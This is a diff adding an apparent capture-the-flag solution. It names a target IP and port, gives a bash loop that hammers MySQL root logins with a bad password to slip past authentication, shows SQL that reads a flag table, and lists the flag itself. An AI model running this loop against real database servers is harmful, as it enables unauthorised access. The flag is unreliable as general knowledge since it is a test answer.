@@ -1,0 +1,14 @@
+"I doubt you'll ever get into this database. It's been hardened by our world-class internal security team." - Comedic Mysql Inc.
+
+34.123.144.218:4048
+
+
+
+
+
+
+`for i in {1..1000}; do mysql -u root --password=bad -h 34.123.144.218 --port 4048 2>/dev/null; done`
+`mysql> USE test_flag; SELECT * FROM flag_tab;`
+ROT13 back
+
+flag{cf556h7vuqea7anfqs39a67re8caeqbc}
